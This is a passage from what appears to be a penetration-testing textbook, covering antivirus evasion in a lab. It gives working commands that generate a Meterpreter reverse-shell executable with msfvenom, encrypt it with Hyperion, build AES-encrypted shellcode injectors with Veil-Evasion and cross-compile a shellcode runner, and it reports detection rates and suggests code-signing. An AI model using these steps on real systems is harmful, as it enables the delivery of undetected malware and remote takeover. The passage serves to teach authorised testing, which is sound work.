### Optimized Text

```c
((void (*)())shellcode)();
```

**Listing 12-7: Finished Custom C File**

Next, we need to compile the C program. The built-in GCC compiler is not suitable for this task, as it would produce an executable for Linux systems. Our goal is to create an executable that runs on a 32-bit Windows system. Therefore, we will use the Mingw32 cross-compiler, which is available in the Kali Linux repositories and was installed in Chapter 1. If you have not yet installed it, you can do so with the following command:

```sh
apt-get install mingw32
```

Once installed, compile your custom C file using the `i586-mingw32msvc-gcc` command. The syntax for using the cross-compiler is similar to that of the standard GCC, as discussed in Chapter 3.

```sh
root@kali:~# i586-mingw32msvc-gcc -o custommeterpreter.exe custommeterpreter.c
```

After compiling, upload the resulting executable to VirusTotal. As of the current writing, 18 antivirus products detect the malicious file. This is an improvement, but Microsoft Security Essentials still identifies our file.

We need to further refine our approach to successfully deploy the malicious executable on a Windows 7 system. (You may achieve better results with a different cross-compiler from another repository.)

### Encrypting Executables with Hyperion

Another method to obfuscate our payload is to encrypt it. One such tool is Hyperion, which uses Advanced Encryption Standard (AES) encryption, a widely accepted industry standard. After encrypting the executable, Hyperion discards the encryption keys. When the executable runs, it brute-forces the encryption key to decrypt itself back to the original executable.

If you have a background in cryptography, this process might raise some concerns. AES is considered a secure encryption standard, and if the executable does not have access to the encryption key, it should not be able to brute-force the key in a reasonable amount of time. However, Hyperion reduces the possible keyspace for the encryption key, making the binaries encrypted with it less cryptographically secure. Since our goal, and the goal of the Hyperion authors, is to obfuscate the code to bypass antivirus detection, the ability to brute-force the key is not a problem.

Let's start by using Hyperion to encrypt a simple Meterpreter executable without any additional antivirus avoidance techniques, as shown in Listing 12-8. (We installed Hyperion in Chapter 1 on page 21).

```sh
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -f exe > meterpreter.exe
root@kali:~# cd Hyperion-1.0/
root@kali:~/Hyperion-1.0# wine ../hyperion ../meterpreter.exe bypassavhyperion.exe
Opening ../bypassav.exe
Copied file to memory: 0x117178
--snip--
Executing fasm.exe
flat assembler version 1.69.31
5 passes, 0.4 seconds, 92672 bytes.
```

**Listing 12-8: Running Hyperion**

Hyperion is designed to run on Windows systems, but we can execute it on Kali Linux using the Wine program, as shown in Listing 12-8. Ensure you are in the Hyperion directory before running `hyperion.exe` with Wine.

Hyperion requires two arguments: the name of the file to encrypt and the name of the encrypted output file. Run Hyperion to encrypt the simple Meterpreter executable. The resulting file will be in the Hyperion 1.0 directory, so upload it to VirusTotal from there.

Using just a Meterpreter executable generated with Msfvenom (without any encoding or custom templates) and encrypting it with Hyperion resulted in 27 antivirus programs on VirusTotal detecting the malicious behavior. While this is not our lowest detection rate, we have achieved our goal. As shown in Figure 12-8, Microsoft Security Essentials did not detect any malicious activity!

**Figure 12-8: Microsoft Security Essentials does not detect malware.**

We can now download and run the Hyperion-encrypted executable on the Windows 7 system with antivirus protection and obtain a Meterpreter session. Although we have not achieved a 0% detection rate, we have met our penetration testing goals.

**Note:** To further reduce the detection rate, try combining Hyperion encryption with other techniques from this section. For example, using Hyperion with a custom template dropped my detection number down to 14.

### Evading Antivirus with Veil-Evasion

Even though we have successfully bypassed Microsoft Security Essentials on Windows 7, the antivirus landscape is constantly evolving. It is important to stay updated with the latest tools and techniques. Veil-Evasion is a Python framework that automates the creation of antivirus-evading payloads, offering multiple techniques. We covered installing Veil-Evasion on Kali Linux in Chapter 1 on page 21; refer back if you need a refresher.

**Note:** As updates are made to Veil-Evasion, your version may differ from what is shown here.

### Python Shellcode Injection with Windows APIs

Previously, we looked at using a custom C template to compile and execute shellcode. We can achieve something similar with Pythonâ€™s Ctypes library, which provides access to Windows API function calls and allows the creation of C-compatible data types. We can use Ctypes to call the Windows API `VirtualAlloc`, which creates a new executable memory region for the shellcode and locks the memory region in physical memory to avoid a page fault. `RtlMoveMemory` is used to copy the shellcode bytes into the memory region created by `VirtualAlloc`. The `CreateThread` API creates a new thread to run the shellcode, and `WaitForSingleObject` waits until the created thread is finished and the shellcode has completed execution.

These steps collectively are referred to as the VirtualAlloc injection method. This method would give us a Python script rather than a Windows executable, but you can use various tools to convert the Python script into a standalone executable.

### Creating Encrypted Python-Generated Executables with Veil-Evasion

One of the methods implemented in Veil-Evasion uses the Python injection technique described earlier. To provide further antivirus protection, Veil-Evasion can use encryption. For our example, we will use Python `VirtualAlloc` injection combined with AES encryption, as we did in the Hyperion example earlier in this chapter.

To start Veil-Evasion, change directories to `Veil-Evasion-master` and run `./Veil-Evasion.py`. You should see a menu-based prompt similar to those in SET from the previous chapter, as shown in Listing 12-9.

```sh
root@kali:~/Veil-Evasion-master# ./Veil-Evasion.py
========================================================================
Veil-Evasion | [Version]: 2.6.0
========================================================================
[Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
========================================================================
Main Menu
28 payloads loaded
Available commands:
use use a specific payload
info information on a specific payload
list list available payloads
update update Veil to the latest version
clean clean out payload folders
checkvt check payload hashes vs. VirusTotal
exit exit Veil
```

**Listing 12-9: Running Veil**

To see all the available payloads in Veil-Evasion, enter `list` at the prompt, as shown in Listing 12-10.

```sh
[>] Please enter a command: list
Available payloads:
1) auxiliary/coldwar_wrapper
2) auxiliary/pyinstaller_wrapper
--snip--
22) python/meterpreter/rev_tcp
23) python/shellcode_inject/aes_encrypt
24) python/shellcode_inject/arc_encrypt
25) python/shellcode_inject/base64_substitution
26) python/shellcode_inject/des_encrypt
27) python/shellcode_inject/flat
28) python/shellcode_inject/letter_substitution
```

**Listing 12-10: Veil-Evasion payloads**

As of this writing, there are 28 ways to create executables implemented in Veil-Evasion. For this example, choose option 23 to use the `VirtualAlloc` injection method and encrypt it with AES encryption. Once you choose a method, Veil-Evasion will prompt you to change the method options from the default, if desired, as shown in Listing 12-11.

```sh
[>] Please enter a command: 23
Payload: python/shellcode_inject/aes_encrypt loaded
Required Options:
Name Current Value Description
---- ------------- -----------
compile_to_exe Y Compile to an executable
expire_payload X Optional: Payloads expire after "X" days
inject_method Virtual Virtual, Void, Heap
use_pyherion N Use the pyherion encrypter
Available commands:
set set a specific option value
info show information about the payload
generate generate payload
back go to the main menu
exit exit Veil
```

**Listing 12-11: Using Python VirtualAlloc in Veil-Evasion**

By default, this payload will compile the Python script into an executable using `VirtualAlloc()` as the injection method. These options are correct for our example, so enter `generate` at the prompt. You will then be prompted for details about the shellcode, as shown in Listing 12-12.

```sh
[?] Use msfvenom or supply custom shellcode?
1 - msfvenom (default)
2 - Custom
[>] Please enter the number of your choice: 1
[*] Press [enter] for windows/meterpreter/reverse_tcp
[*] Press [tab] to list available payloads
[>] Please enter metasploit payload:
[>] Enter value for 'LHOST', [tab] for local IP: 192.168.20.9
[>] Enter value for 'LPORT': 2345
[>] Enter extra msfvenom options in OPTION=value syntax:
[*] Generating shellcode...
[*] Press [enter] for 'payload'
[>] Please enter the base name for output files: meterpreterveil
[?] How would you like to create your payload executable?
1 - Pyinstaller (default)
2 - Py2Exe
[>] Please enter the number of your choice: 1
--snip--
[*] Executable written to: /root/veil-output/compiled/meterpreterveil.exe
Language: python
Payload: AESEncrypted
Shellcode: windows/meterpreter/reverse_tcp
Options: LHOST=192.168.20.9 LPORT=2345
Required Options: compile_to_exe=Y inject_method=virtual use_pyherion=N
Payload File: /root/veil-output/source/meterpreterveil.py
Handler File: /root/veil-output/handlers/meterpreterveil_handler.rc
[*] Your payload files have been generated, don't get caught!
[!] And don't submit samples to any online scanner! ;)
```

**Listing 12-12: Generating the executable in Veil-Evasion**

Veil-Evasion prompts you to select either Msfvenom to generate the shellcode or to provide custom shellcode. For our purposes, choose Msfvenom. The default payload is `windows/meterpreter/reverse_tcp`, so press enter to select it. You will be prompted for the usual options, `LHOST` and `LPORT`, and for a filename for the generated executable. Finally, Veil-Evasion offers two Python-to-executable methods. Choose the default, Pyinstaller, to have Veil-Evasion generate the malicious executable and save it to the `veil-output/compiled` directory.

As of this writing, the resulting executable bypasses Microsoft Security Essentials on our Windows 7 system. Veil-Evasion advises against uploading the resulting executable to online scanners, so we will forgo checking this example with VirusTotal. However, you can install other antivirus solutions to see if the executable is flagged.

**Note:** If you find that the Veil-Evasion executables are not working, you might need to update Metasploit with `msfupdate`. Since Veil-Evasion is not currently in the Kali Linux repositories, the latest version you pull down when you set up may not match how Msfvenom works in the default Kali 1.0.6 install. Updating Metasploit with `msfupdate` may change the functionality of other exercises in this book, as Metasploitâ€™s functionality changes frequently. Therefore, you may want to save this exercise for a second pass through the book or use a second Kali Linux image if you do not want the update to affect later exercises.

### Hiding in Plain Sight

Perhaps the best way to avoid antivirus programs is to avoid traditional payloads altogether. If you are familiar with coding for Windows, you can use Windows APIs to mimic the functionality of a payload. There is no rule that legitimate applications cannot open a TCP connection to another system and send dataâ€”essentially what our `windows/meterpreter/reverse_tcp` payload does.

You may find that instead of generating the payload with Msfvenom and attempting to hide it with the methods covered in this chapter, you get even better results by writing a C program that performs the payload functionality you want. You can even invest in a code-signing certificate to sign your binary executable, making it look more legitimate.

**Note:** Turn Real-time protection in Microsoft Security Essentials back off before moving on to post-exploitation.

### Summary

In this chapter, we explored several techniques for bypassing antivirus detection. The topic of bypassing antivirus solutions is vast and constantly evolving. Penetration testers and researchers continually develop new techniques to evade antivirus detection, while antivirus vendors continuously add new signatures and heuristics to catch them.

We looked at ways to use Metasploit to encode and embed payloads in legitimate executables. When these techniques were insufficient to evade Microsoft Security Essentials, we turned to other methods. We built a custom executable template and found that combining techniques improved our results.

We finally reached our goal of bypassing Microsoft Security Essentials using Hyperion. Although we did not achieve a 0% detection rate, we were able to bypass Microsoft Security Essentials and several other top antivirus solutions. We also examined another tool, Veil-Evasion, which uses `VirtualAlloc` injection combined with encryption for even better evasion.

Having explored various ways to gain access to systems, even those without apparent vulnerabilities, we will now focus on what we can do once we penetrate a system, entering the post-exploitation stage of penetration testing.

### Post-Exploitation

We have gained access to our target systems, so is our penetration test over? Can we simply tell our client that we obtained a shell on their systems?

But why should the client care? In the post-exploitation phase, we will gather information from the exploited systems, escalate privileges, and move from one system to another. We may find sensitive data stored on the exploited system or discover network access to additional systems that can provide further access to company data. Perhaps the exploited system is part of a domain, and we can use it to access other systems on the domain. These are just a few of the potential avenues open to us in post-exploitation.

Post-exploitation is arguably the most important phase for gaining a clear picture of a clientâ€™s security posture. For example, in Chapter 9, I mentioned a penetration test where I used access to a decommissioned Windows 2000 domain controller to gain complete administrative control over a domain. If I had not used post-exploitation techniques, I might have concluded that the Windows 2000 system stored no sensitive information and that it wasnâ€™t a significant security risk.